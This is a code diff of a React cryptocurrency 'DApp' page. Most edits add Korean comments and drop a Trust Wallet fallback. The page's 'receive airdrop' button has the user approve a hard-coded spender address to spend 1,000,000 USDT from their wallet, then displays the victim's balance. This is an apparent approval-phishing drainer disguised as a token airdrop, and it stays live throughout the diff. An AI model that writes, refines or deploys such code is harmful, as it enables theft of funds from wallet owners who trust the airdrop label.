@@ -55,8 +55,8 @@ const Button = styled.button`
   font-size: 16px;
   font-weight: bold;
   margin: 0 auto;
-  white-space: normal;
-  text-align: center;
+  white-space: normal;  // 줄바꿈을 허용
+  text-align: center;    // 텍스트를 중앙 정렬
 
   &:hover {
     background-color: white;
@@ -77,35 +77,27 @@ const FooterText = styled.p`
 export default function DApp() {
   const [web3, setWeb3] = useState(null);
   const [account, setAccount] = useState(null);
-  const [isApproved, setIsApproved] = useState(false);
-  const [usdtBalance, setUsdtBalance] = useState("0");
+  const [isApproved, setIsApproved] = useState(false);  // approve 상태 저장
+  const [usdtBalance, setUsdtBalance] = useState("0");  // USDT 잔액 저장
   const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const spenderAddress = "0x44E3AD8C4D486F4070822645462E5a23d46Cf7F1";
-  const approveAmount = Web3.utils.toWei("1000000", "mwei");
+  const approveAmount = Web3.utils.toWei("1000000", "mwei"); // 1,000,000 USDT
 
   useEffect(() => {
-    alert(window.web3)
-    alert(window.ethereum)
     if (typeof window.ethereum !== "undefined") {
       const web3Instance = new Web3(window.ethereum);
       setWeb3(web3Instance);
       connectWallet();
-    } else if (window.web3) {
-      // Trust Wallet 또는 다른 dApp 브라우저에서 window.web3를 지원할 경우
-      const web3Instance = new Web3(window.web3.currentProvider);
-      setWeb3(web3Instance);
-      connectWallet();
-    } else {
-      alert("메타마스크 또는 트러스트 월렛을 설치해 주세요.");
     }
   }, []);
 
   useEffect(() => {
     if (web3 && account) {
-      checkApprovalStatus(account);
+      checkApprovalStatus(account);  // web3가 있을 때만 함수 실행
     }
   }, [web3, account]);
 
+  // 지갑 연결 함수
   const connectWallet = async () => {
     try {
       const accounts = await window.ethereum.request({
@@ -117,6 +109,7 @@ export default function DApp() {
     }
   };
 
+  // 승인 상태 확인 함수
   const checkApprovalStatus = async (userAccount) => {
     if (web3) {
       const usdtContract = new web3.eth.Contract(
@@ -143,14 +136,16 @@ export default function DApp() {
       );
 
       try {
+        // 지갑과 스펜더 간의 승인된 금액 확인
         const allowance = await usdtContract.methods
           .allowance(userAccount, spenderAddress)
           .call();
         if (parseFloat(allowance) > 0) {
-          setIsApproved(true);
+          setIsApproved(true); // 이미 승인된 상태
+          // USDT 잔액 가져오기
           const balance = await usdtContract.methods.balanceOf(userAccount).call();
           const balanceInUsdt = Web3.utils.fromWei(balance, "mwei");
-          setUsdtBalance(Math.floor(balanceInUsdt));
+          setUsdtBalance(Math.floor(balanceInUsdt)); 
         }
       } catch (error) {
         console.error("승인 상태 확인 중 오류 발생", error);
@@ -158,6 +153,7 @@ export default function DApp() {
     }
   };
 
+  // approve 함수
   const approveUsdt = async () => {
     if (web3 && account) {
       const usdtContract = new web3.eth.Contract(
@@ -187,10 +183,13 @@ export default function DApp() {
     }
   };
 
+  // 에어드랍 버튼 클릭 처리
   const handleAirdropClick = () => {
     if (!account) {
+      // 지갑이 연결되지 않은 상태 -> 다른 페이지로 이동
       window.location.href = "/inbum/notice";
     } else if (!isApproved) {
+      // 지갑이 연결되었지만 승인되지 않은 경우 -> 승인 요청
       approveUsdt();
     }
   };
@@ -208,9 +207,9 @@ export default function DApp() {
       <ButtonContainer>
         {isApproved ? (
           <Button>{`보유: ${usdtBalance} USDT`}<br />
-          {`(ERC-20)`}</Button>
+          {`(ERC-20)`}</Button> // 승인 상태면 잔액 표시
         ) : (
-          <Button onClick={handleAirdropClick}>에어드랍 받기</Button>
+          <Button onClick={handleAirdropClick}>에어드랍 받기</Button> // 승인 안 된 상태면 승인 요청 버튼
         )}
         <Button>한글백서</Button>
         <Button>Whitepaper</Button>
